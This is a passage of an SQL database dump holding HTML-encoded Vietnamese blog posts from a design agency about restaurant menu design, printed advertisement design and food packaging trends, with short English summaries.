r&otilde; r&agrave;ng v&agrave; đầy đủ, bởi một thực đơn thiết kế sai, lỗi thường dễ d&agrave;ng khiến bạn bị mất kh&aacute;ch hơn nhiều.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Đ&acirc;y cũng l&agrave; l&yacute; do khi thiết kế thực đơn nh&agrave; h&agrave;ng ch&uacute;ng ta cần kiểm tra lại t&agrave;i liệu kỹ c&agrave;ng để chuẩn bị cho việc in ấn thuận lợi hơn.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">3. Những m&oacute;n trong thực đơn c&oacute; gi&aacute; cao hơn nhưng số lượng nhiều hơn</span></strong></h2>\r\n<p style=\"text-align: center;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/18_4.jpg\" alt=\"\" width=\"1400\" height=\"875\" /></span></strong></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Th&ocirc;ng thường khi thiết kế thực đơn nh&agrave; h&agrave;ng, việc để c&aacute;c m&oacute;n trong thực đơn c&oacute; số lượng nhiều hơn&nbsp; với gi&aacute; cao hơn, nhưng th&agrave;nh phần lại như những bữa ăn ti&ecirc;u chuẩn đa phần đều gi&uacute;p nh&agrave; h&agrave;ng c&oacute; mức b&agrave;n h&agrave;ng tốt hơn nhiều.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ch&iacute;nh v&igrave; vậy khi đ&aacute;nh dấu tiền tệ, việc đ&aacute;nh dấu những k&yacute; hiệu tiền tệ sẽ gi&uacute;p đ&aacute;nh lạc hướng sự ch&uacute; &yacute; của kh&aacute;ch h&agrave;ng từ gi&aacute; tiền m&oacute;n ăn chuyển sang th&agrave;nh phần của m&oacute;n ăn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Đ&acirc;y cũng l&agrave; ti&ecirc;u ch&iacute; quan trọng khi thiết kế thực đơn ch&uacute;ng ta cần ch&uacute; &yacute;.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">4. Chỉ r&otilde; c&aacute;c phần được giảm gi&aacute;</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">B&ecirc;n trong thực đơn nh&agrave; h&agrave;ng khi thiết kế ch&uacute;ng ta cũng cần chỉ r&otilde; những th&agrave;nh phần được giảm gi&aacute; trong thực đơn, đ&acirc;y cũng l&agrave; dấu hiệu gi&uacute;p thu h&uacute;t kh&aacute;ch h&agrave;ng chọn lựa m&oacute;n ăn từ thực đơn nhanh ch&oacute;ng v&agrave; tiện lợi hơn.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/19_3.jpg\" alt=\"\" width=\"1999\" height=\"1206\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ngo&agrave;i ra ch&uacute;ng ta cần ch&uacute; &yacute; tới k&iacute;ch thước ph&ocirc;ng chữ trong thực đơn, trong đ&oacute; ph&ocirc;ng chữ phổ biến được nhiều người đọc đa phần l&agrave; c&aacute;c ph&ocirc;ng như Ariel, Times New Roman hoặc Arial Black.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ngo&agrave;i ra ch&uacute;ng ta cần ch&uacute; &yacute; ch&egrave;n th&ecirc;m trong cuối trang thực đơn về th&ocirc;ng tin trang web, điện thoại dịch vụ giao h&agrave;ng, email li&ecirc;n hệ đặt h&agrave;ng để người d&ugrave;ng c&oacute; thể ghi nhớ nhanh ch&oacute;ng v&agrave; dễ d&agrave;ng hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Trong trường hợp thực đơn bị bẩn, cũ ch&uacute;ng ta cần thay mới thực đơn ngay lập tức để đảm bảo tạo sự thu h&uacute;t với người d&ugrave;ng hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;</span></p>', '<p>Creative menu design says alot about a restaurant. To attract customers from the first look, the menu can not be anything but an &nbsp;impressive, eye-catching and unique piece of art.</p>\r\n<p>&nbsp;</p>', 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tin-tuc', 0, '2018-10-17 14:22:53', '2018-10-17 07:22:53'),
(33, 0, 5, 'Những chú ý khi thiết kế quảng cáo báo in bạn không thể bỏ qua', 'Tips for designing printed ads you can not ignore', 'nhung-chu-y-khi-thiet-ke-quang-cao-bao-in-ban-khong-the-bo-qua', 'tips-for-designing-printed-ads-you-can-not-ignore', '1539784839_14.jpg', '', 'Thiết kế quảng cáo báo in là nhu cầu không thể thiếu của mọi doanh nghiệp, với mẫu quảng cáo', NULL, '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><strong><em><u>Thiết kế quảng c&aacute;o b&aacute;o in</u></em> l&agrave; nhu cầu kh&ocirc;ng thể thiếu của mọi doanh nghiệp, với mẫu quảng c&aacute;o b&aacute;o in ấn tượng cũng g&oacute;p phần gi&uacute;p c&ocirc;ng ty, doanh nghiệp hoạt động hiệu quả v&agrave; tạo uy t&iacute;n lớn tới người ti&ecirc;u d&ugrave;ng.</strong></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Dưới đ&acirc;y l&agrave; một v&agrave;i ch&uacute; &yacute; khi thiết kế quảng c&aacute;o b&aacute;o in m&agrave; kh&aacute;ch h&agrave;ng c&oacute; thể t&igrave;m hiểu.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Thế n&agrave;o l&agrave; h&igrave;nh thức thiết kế quảng c&aacute;o b&aacute;o in?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Đối với mỗi doanh nghiệp, c&ocirc;ng ty nếu cần thiết kế quảng c&aacute;o b&aacute;o in th&igrave; ti&ecirc;u ch&iacute; đầu ti&ecirc;n đ&ograve;i hỏi ch&iacute;nh l&agrave; sự s&aacute;ng tạo phải cao, trong đ&oacute; b&ecirc;n trong quảng c&aacute;o b&aacute;o in phải bao h&agrave;m được đầy đủ những th&ocirc;ng điệp truyền th&ocirc;ng mạnh mẽ, gi&uacute;p quảng b&aacute; thương hiệu v&agrave; tăng cường mức độ nhận biết cho người d&ugrave;ng, từ đ&oacute; n&acirc;ng cao th&uacute;c đẩy b&aacute;n h&agrave;ng nhiều hơn.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/13_5.jpg\" alt=\"\" width=\"1129\" height=\"661\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Th&ocirc;ng thường mỗi quảng c&aacute;o b&aacute;o in c&oacute; k&iacute;ch thước kh&aacute; đa dạng v&agrave; kh&aacute;c biệt, trong đ&oacute; quảng c&aacute;o b&aacute;o in c&oacute; thể l&agrave; một tờ to&agrave;n trang b&aacute;o được thiết kế khổ đứng, nhưng cũng c&oacute; thể l&agrave; một tờ b&aacute;o với thiết kế khổ ngang chỉ một nửa trang hoặc &frac14; trang b&aacute;o t&ugrave;y theo mức kinh ph&iacute; v&agrave; nội dung.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Nhiều trường hợp khi thiết kế quảng c&aacute;o b&aacute;o in cũng c&oacute; thể th&ocirc;ng qua baner quảng c&aacute;o hoặc poster, doanh nghiệp c&oacute; thể c&acirc;n nhắc t&ugrave;y theo từng t&igrave;nh huống để c&oacute; được phương ph&aacute;p quảng b&aacute; v&agrave; s&aacute;ng tạo sao cho th&iacute;ch hợp nhất.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Thiết kế quảng c&aacute;o b&aacute;o in được đ&aacute;nh gi&aacute; l&agrave; phương thức truyền th&ocirc;ng mang lại hiệu quả cao, đ&ograve;i hỏi nhiều y&ecirc;u cầu v&agrave; mong muốn đ&aacute;p ứng được kỳ vọng của doanh nghiệp, chi ph&iacute; thiết kế quảng c&aacute;o b&aacute;o in cũng kh&ocirc;ng hề nhỏ bởi độ kh&oacute; của loại h&igrave;nh thiết kế n&agrave;y.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/15_2.jpg\" alt=\"\" width=\"1129\" height=\"661\" /></span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. Thiết kế quảng c&aacute;o b&aacute;o in cần những g&igrave; ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Y&ecirc;u cầu đầu ti&ecirc;n của thiết kế quảng c&aacute;o b&aacute;o in l&agrave; phải c&oacute; sự s&aacute;ng tạo lớn, thể hiện đầy đủ, ho&agrave;n chỉnh &yacute; tưởng v&agrave; th&ocirc;ng điệp cần truyền tải của kh&aacute;ch h&agrave;ng, trong đ&oacute; quảng c&aacute;o cũng cần phải được thiết kế đẹp mắt, thu h&uacute;t v&agrave; ấn tượng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Một thiết kế quảng c&aacute;o b&aacute;o in ho&agrave;n hảo thường c&oacute; mức chi ph&iacute; cao, nhưng lại mang tới cho doanh nghiệp t&aacute;c dụng cực lớn, gi&uacute;p quảng c&aacute;o đưa tới đ&uacute;ng đối tượng kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Những thiết kế quảng c&aacute;o b&aacute;o in s&aacute;ng tạo cũng giống như những &ldquo;thiết kế biết n&oacute;i&rdquo; gi&uacute;p kh&aacute;ch h&agrave;ng c&oacute; thể thu về được số lượng doanh thu cao, ấn tượng v&agrave; l&agrave; h&igrave;nh thức quảng c&aacute;o tất yếu nếu kh&aacute;ch h&agrave;ng c&oacute; đầy đủ ng&acirc;n s&aacute;ch, mang tới cho quảng c&aacute;o sự hấp dẫn v&agrave; hiệu quả tối đa.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/16_2.jpg\" alt=\"\" width=\"1920\" height=\"1179\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Để thiết kế quảng c&aacute;o b&aacute;o in ấn tượng, ch&uacute;ng ta cần phải t&igrave;m hiểu kỹ ấn phẩm quảng c&aacute;o trước khi thiết kế, đảm bảo ph&ugrave; hợp với đối tượng độc giả.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ngo&agrave;i ra thiết kế quảng c&aacute;o b&aacute;o in phải đảm bảo được t&iacute;nh độc quyền, c&oacute; thể tạo được ấn tượng cao cho người xem, sự hấp dẫn lớn m&agrave; những quảng c&aacute;o kh&aacute;c kh&ocirc;ng l&agrave;m được.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Mọi th&ocirc;ng tin c&oacute; trong quảng c&aacute;o b&aacute;o in phải s&uacute;c t&iacute;ch, thể hiện được r&otilde; mục ti&ecirc;u quảng c&aacute;o, c&oacute; thể dẫn dắt người xem v&agrave; sử dụng sản phẩm cũng như dịch vụ quảng c&aacute;o.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ngo&agrave;i ra m&agrave;u sắc, h&igrave;nh ảnh c&ugrave;ng bố cục của từng thiết kế quảng c&aacute;o b&aacute;o in cần thi&ecirc;n theo hướng nghệ thuật v&agrave; truyền cảm, đẹp v&agrave; ấn tượng về cả m&agrave;u sắc, mẫu m&atilde; cho tới nội dung.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Để thiết kế quảng c&aacute;o b&aacute;o in ấn tượng v&agrave; độc đ&aacute;o, kh&aacute;ch h&agrave;ng c&oacute; thể t&igrave;m tới dịch vụ thiết kế quảng c&aacute;o b&aacute;o in tại GCO ch&uacute;ng t&ocirc;i. Tại đ&acirc;y ch&uacute;ng t&ocirc;i c&oacute; đầy đủ mọi chuy&ecirc;n gia trong lĩnh vực thiết kế v&agrave; x&acirc;y dựng thương hiệu, c&oacute; kinh nghiệm l&acirc;u năm trong lĩnh vực thiết kế quảng c&aacute;o, truyền th&ocirc;ng tiếp thị tại Việt Nam, đảm bảo mang tới cho kh&aacute;ch h&agrave;ng đ&uacute;ng điều m&agrave; bạn đang cần.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;</span></p>', '<p>Printed advertisement is indispensable for all companies. An impresive printed ads make the great contribution to the company prestige and eficient operation</p>\r\n<p>&nbsp;</p>', 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tin-tuc', 0, '2018-10-17 14:10:22', '2018-10-17 07:10:22'),
(36, 0, 5, 'Xu hướng thiết kế bao bì thực phẩm mới nhất trong năm nay ( phần 1 )', 'Xu hướng thiết kế bao bì thực phẩm mới nhất trong năm nay ( phần 1 )', 'xu-huong-thiet-ke-bao-bi-thuc-pham-moi-nhat-trong-nam-nay-phan-1', 'xu-huong-thiet-ke-bao-bi-thuc-pham-moi-nhat-trong-nam-nay-phan-1', '1539772425_2.jpg', '', 'Thiết kế bao bì thực phẩm chính là một trong những việc làm quan trọng để giúp đưa thực phẩm', NULL, '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Thiết kế <strong><em><u>bao b&igrave; thực phẩm </u></em></strong>ch&iacute;nh l&agrave; một trong những việc l&agrave;m quan trọng để gi&uacute;p đưa thực phẩm tới tay người ti&ecirc;u d&ugrave;ng thuận lợi nhất, đặc biệt việc bắt kịp xu hướng thiết kế bao b&igrave; thực phẩm kh&ocirc;ng chỉ đảm bảo mang lại hiệu quả kinh doanh cao m&agrave; c&ograve;n đảm bảo t&iacute;nh quảng b&aacute; thương hiệu lớn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Dưới đ&acirc;y l&agrave; một số xu hướng thiết kế bao b&igrave; thực phẩm mới trong năm nay m&agrave; ch&uacute;ng ta c&oacute; thể t&igrave;m hiểu v&agrave; tham khảo.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Thiết kế đơn giản, c&oacute; điểm nhấn, th&ocirc;ng tin r&otilde; r&agrave;ng</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Một bảo b&igrave; thực phẩm c&oacute; thiết kế đơn giản, tạo điểm nhấn v&agrave; c&oacute; th&ocirc;ng tin r&otilde; r&agrave;ng lu&ocirc;n dễ tạo được sức h&uacute;t đối với những người mua h&agrave;ng.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/7_2.jpg\" alt=\"\" width=\"946\" height=\"505\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">L&uacute;c n&agrave;y ch&uacute;ng ta cũng cần đảm bảo những thiết kế bao b&igrave; sản phẩm cần đảm bảo c&oacute; m&agrave;u sắc tối giản, tinh gọn v&agrave; tạo thiện cảm với người d&ugrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Đặc biệt với nhu cầu mua sắm nhanh gọn của kh&aacute;ch h&agrave;ng hiện nay, kh&ocirc;ng c&oacute; nhiều kh&aacute;ch h&agrave;ng c&oacute; đủ ki&ecirc;n nhẫn để tỉ mỉ kiểm tra, xem v&agrave; t&igrave;m hiểu những thực phẩm c&oacute; bao b&igrave; cầu kỳ, rối mắt, ch&iacute;nh v&igrave; vậy&nbsp; một bao b&igrave; sản phẩm tối giản, kh&ocirc;ng rối mắt cũng gi&uacute;p kh&aacute;ch h&agrave;ng dễ t&igrave;m kiếm v&agrave; sử dụng hơn.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. &Aacute;p dụng Lettering trong thiết kế bao b&igrave; thực phẩm</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Sử dụng kiểu chữ c&aacute;ch điệu trong thiết kế bao b&igrave; thực phẩm cũng gi&uacute;p tạo ấn tượng với kh&aacute;ch h&agrave;ng tốt hơn, được xem l&agrave; mặt lợi kh&aacute; lớn cho nhiều nh&agrave; thiết kế hiện đại v&agrave; kh&ocirc;ng cần tới sự can thiệp của c&ocirc;ng cụ kỹ thuật số.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Xu hướng thiết kế bao b&igrave; thực phẩm Lettering cũng được &aacute;p dụng rộng r&atilde;i, ph&ugrave; hợp với đối tượng kh&aacute;ch h&agrave;ng năng động, trẻ trung v&agrave; mang lại nhiều hứng th&uacute; cho kh&aacute;ch h&agrave;ng, chinh phục sự ch&uacute; &yacute; của người d&ugrave;ng.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/8_2.jpg\" alt=\"\" width=\"946\" height=\"661\" /></span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">3. D&ugrave;ng m&agrave;u sắc sặc sỡ trong thiết kế bao b&igrave;</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Sử dụng m&agrave;u sắc sặc sỡ trong thiết kế bao b&igrave; cũng l&agrave; ti&ecirc;u ch&iacute; quan trọng gi&uacute;p thiết kế bao b&igrave; thực phẩm thu h&uacute;t kh&aacute;ch h&agrave;ng hơn cả.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Bởi v&igrave; kh&aacute;ch h&agrave;ng thời nay phần đ&ocirc;ng đều c&oacute; kh&aacute; &iacute;t thời gian chọn lựa sản phẩm, chưa kể việc mua h&agrave;ng qua internet cũng đang chiếm lợi thế, việc mua h&agrave;ng qua mạng cũng được ch&uacute; trọng hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ch&iacute;nh v&igrave; vậy với một bao b&igrave; sản phẩm c&oacute; m&agrave;u sắc ấn tượng, nổi bật thường dễ t&aacute;c động mạnh tới thị gi&aacute;c của kh&aacute;ch h&agrave;ng, đảm bảo mang lại sự th&iacute;ch th&uacute; cho kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Xu hướng sử dụng m&agrave;u sắc sặc sỡ trong thiết kế cũng c&agrave;ng xuất hiện nhiều v&agrave; được &aacute;p dụng nhiều tr&ecirc;n những kệ h&agrave;ng sản phẩm, gi&uacute;p n&iacute;u ch&acirc;n kh&aacute;ch h&agrave;ng hiệu quả hơn.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/9_2.jpg\" alt=\"\" width=\"1129\" height=\"661\" /></span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">4. Thể hiện c&acirc;u chuyện thương hiệu qua thiết kế bao b&igrave;</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Thiết kế bao b&igrave; thực phẩm ấn tượng bằng c&aacute;ch thể hiện c&acirc;u chuyện thương hiệu cũng thu h&uacute;t kh&aacute;ch h&agrave;ng hơn cả, đặc biệt việc d&ugrave;ng h&igrave;nh ảnh minh họa nhằm tường thuật nội dung sản phẩm cũng rất được ưa chuộng hiện nay.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">C&acirc;u chuyện c&oacute; thể l&agrave; quy tr&igrave;nh sản xuất, chế biến hoặc sử dụng sản phẩm, tạo th&agrave;nh c&acirc;u chuyện thương hiệu vừa hấp dẫn lại vừa ngắn gọn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Với c&aacute;ch l&agrave;m n&agrave;y ch&uacute;ng ta cần thể hiện bao b&igrave; thực phẩm c&oacute; h&igrave;nh ảnh ấn tượng, th&ocirc;ng điệp truyền tải phải cuốn h&uacute;t để đảm bảo hiệu quả v&agrave; th&agrave;nh c&ocirc;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;</span></p>', NULL, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tin-tuc', 0, '2018-10-17 13:49:08', '2018-10-17 06:49:08'),
(37, 0, 5, 'Xu hướng thiết kế bao bì thực phẩm mới nhất trong năm nay ( phần 2 )', 'Xu hướng thiết kế bao bì thực phẩm mới nhất trong năm nay ( phần 2 )', 'xu-huong-thiet-ke-bao-bi-thuc-pham-moi-nhat-trong-nam-nay-phan-2', 'xu-huong-thiet-ke-bao-bi-thuc-pham-moi-nhat-trong-nam-nay-phan-2', '1539772225_1.jpg', '', 'Trong thời buổi thị trường cạnh tranh hiện nay, những dòng sản phẩm tiêu dùng như thực phẩm ...', NULL, '<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Trong thời buổi thị trường cạnh tranh hiện nay, những d&ograve;ng sản phẩm ti&ecirc;u d&ugrave;ng như thực phẩm nếu muốn thu h&uacute;t người ti&ecirc;u d&ugrave;ng ch&uacute; &yacute; th&igrave; cần đảm bảo c&oacute; thiết kế <strong><em><u>bao b&igrave; thực phẩm</u></em></strong> ấn tượng, bắt đ&uacute;ng trend v&agrave; tạo đ&uacute;ng xu hướng để g&acirc;y thiện cảm với người d&ugrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">C&ugrave;ng t&igrave;m hiểu th&ecirc;m xu hướng thiết kế bao b&igrave; thực phẩm mới nhất trong năm nay qua b&agrave;i viết dưới đ&acirc;y.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">1. Thiết kế bao b&igrave; thực phẩm theo phong c&aacute;ch bưu phẩm</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Sử dụng phong c&aacute;ch bưu phẩm trong thiết kế bao b&igrave; thực phẩm cũng l&agrave; một điểm nhấn đặc biệt v&agrave; đột ph&aacute; gi&uacute;p người d&ugrave;ng c&oacute; thể thiết kế bao b&igrave; thực phẩm ấn tượng hơn.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/6_1.jpg\" alt=\"\" width=\"1241\" height=\"608\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Với bao b&igrave; thực phẩm được thiết kế theo phong c&aacute;ch bưu phẩm thương mang lại cho kh&aacute;ch h&agrave;ng cảm gi&aacute;c th&iacute;ch th&uacute;, t&ograve; m&ograve; khi mở bao b&igrave;, cảm gi&aacute;c giống như vừa nhận được một m&oacute;n qu&agrave; từ đơn vị sản xuất vậy.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Điều n&agrave;y cũng mang tới cho kh&aacute;ch h&agrave;ng những trải nghiệm mới lạ, ch&uacute;ng ta c&oacute; thể tận dụng t&acirc;m l&yacute; n&agrave;y của kh&aacute;ch h&agrave;ng để thiết kế c&aacute;c mẫu bao b&igrave; ấn tượng, mang phong c&aacute;ch bưu phẩm cuốn h&uacute;t v&agrave; hấp dẫn.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">2. Bao b&igrave; thực phẩm thiết kế theo xu hướng sử dụng như một phần của bao b&igrave;</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Thực chất việc để cho kh&aacute;ch h&agrave;ng mua sản phầm t&ograve; m&ograve; về h&igrave;nh ảnh sản phẩm sau lớp bao b&igrave; cũng l&agrave; một trong những phương ph&aacute;p thiết kế bao b&igrave; thực phẩm hay đảm bảo tạo hứng th&uacute; v&agrave; sức hấp dẫn với kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">C&aacute;ch l&agrave;m n&agrave;y g&oacute;p phần khẳng định r&otilde; hơn về chất lượng cũng như mẫu m&atilde; của sản phẩm đối với thương hiệu.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/4_1.jpg\" alt=\"\" width=\"1500\" height=\"627\" /></span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">3. Thiết kế bao b&igrave; theo phong c&aacute;ch Vintage</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Bao b&igrave; được thiết kế theo phong c&aacute;ch Vintage cũng l&agrave; phong c&aacute;ch thiết kế ấn tượng được sử dụng nhiều trong thiết kế bao b&igrave; sản phẩm, đặc biệt l&agrave; trong thời gian 3 năm trở lại đ&acirc;y phong c&aacute;ch thiết kế bao b&igrave; n&agrave;y rất được người d&ugrave;ng y&ecirc;u th&iacute;ch.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Với bao b&igrave; được thiết kế theo phong c&aacute;ch Vintage thường ph&ugrave; hợp để đ&oacute;ng g&oacute;i sản phẩm hay thực phẩm ho&agrave;n to&agrave;n từ thi&ecirc;n nhi&ecirc;n.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Trong năm nay phong c&aacute;ch thiết kế bao b&igrave; thực phẩm Vintage cũng được n&acirc;ng cấp ho&agrave;n to&agrave;n mới, mang lại cho người d&ugrave;ng phong c&aacute;ch hiện đại v&agrave; cao cấp hơn hẳn.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">4. Thiết kế bao b&igrave; th&acirc;n thiện với m&ocirc;i trường</span></strong></h2>\r\n<p style=\"text-align: center;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/5_1.jpg\" alt=\"\" width=\"1417\" height=\"709\" /></span></strong></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Một trong những xu hướng thiết kế bao b&igrave; kh&aacute;c m&agrave; ch&uacute;ng ta kh&ocirc;ng thể bỏ qua ch&iacute;nh l&agrave; thiết kế bao b&igrave; đảm bảo th&acirc;n thiện với m&ocirc;i trường v&agrave; bảo vệ m&ocirc;i trường.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Ch&iacute;nh v&igrave; vậy hiện nay phần đ&ocirc;ng bao b&igrave; thực phẩm đều sử dụng những vật liệu th&acirc;n thiện với m&ocirc;i trường thay v&igrave; những bao b&igrave; nilon như trước đ&acirc;y, đảm bảo bao b&igrave; được thiết kế v&agrave; sản xuất dễ d&agrave;ng ph&acirc;n hủy, c&oacute; thể ứng dụng lại l&agrave;m nguy&ecirc;n liệu t&aacute;i chế.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Đ&acirc;y cũng l&agrave; một trong những xu hướng thiết kế bao b&igrave; nổi bật được &aacute;p dụng trong những năm gần đ&acirc;y, chưa kể việc sử dụng được những vật liệu c&oacute; thể t&aacute;i chế 